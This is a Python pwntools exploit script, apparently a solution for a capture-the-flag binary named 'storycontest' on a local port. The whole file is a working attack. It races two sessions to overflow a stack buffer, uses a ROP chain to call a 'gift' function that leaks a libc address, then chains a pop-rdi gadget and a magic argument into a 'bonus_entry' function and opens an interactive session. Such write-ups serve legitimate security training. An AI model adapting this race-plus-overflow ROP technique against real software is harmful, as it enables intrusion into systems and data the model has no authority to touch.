from pwn import *

HOST = "localhost"
PORT = 5555

context.log_level = "info"
exe  = ELF("players/storycontest")
libc = ELF("players/libc.so.6")
rop_exe = ROP(exe)

def start():
    return remote(HOST, PORT)

def menu(io):
    io.recvuntil(b"> ")

def menu_submit_begin(io, length: int):
    menu(io)
    io.sendline(b"1")
    io.recvuntil(b"Choose a length limit for your story: ")
    io.sendline(str(length).encode())


def menu_submit_send_story(io, payload: bytes):
    io.recvuntil(b"Now type your story:")
    io.send(payload)


def menu_show_last_story(io):
    menu(io)
    io.sendline(b"2")
    data = io.recvuntil(b"=== StoryJury ===", drop=False, timeout=1)
    return data


def menu_show_jury_info(io):
    menu(io)
    io.sendline(b"3")
    data = io.recvuntil(b"=== StoryJury ===", drop=False, timeout=1)
    return data


def get_leak():
    log.info("Starting leak...")
    victim = start()
    racer = start()
    menu_submit_begin(victim, 64) 
    menu_submit_begin(racer, 256)
    log.info("Calling gift...")
    payload = b"A" * 168 + p64(rop_exe.find_gadget(['ret']).address) + p64(exe.sym.gift)
    menu_submit_send_story(victim, payload)
    io = start()
    data = menu_show_jury_info(io)
    leak = int([l.split(b"Jury gift:")[1].strip()[2:].decode() for l in data.split(b"\n") if b"Jury gift:" in l][0], 16)
    libc.address = leak - 0x2045c0
    log.success(f"Libc base: {hex(libc.address)}")
    sleep(0.2)
    victim.close()
    racer.close()

def main():
    get_leak()
    victim = start()
    racer = start()
    menu_submit_begin(victim, 64) 
    menu_submit_begin(racer, 256)
    log.info("Flag...")
    pop_rdi = libc.address + 0x10f78b
    payload = b"A" * 168 + p64(rop_exe.find_gadget(['ret']).address) + p64(pop_rdi) + p64(0x1337C0DE) + p64(exe.sym.bonus_entry) + p64(rop_exe.find_gadget(['ret']).address) + p64(exe.sym.gift)
    menu_submit_send_story(victim, payload)
    io = start()
    io.sendline(b"4")
    io.interactive()
    victim.close()
    racer.close()

if __name__ == "__main__":
    main()
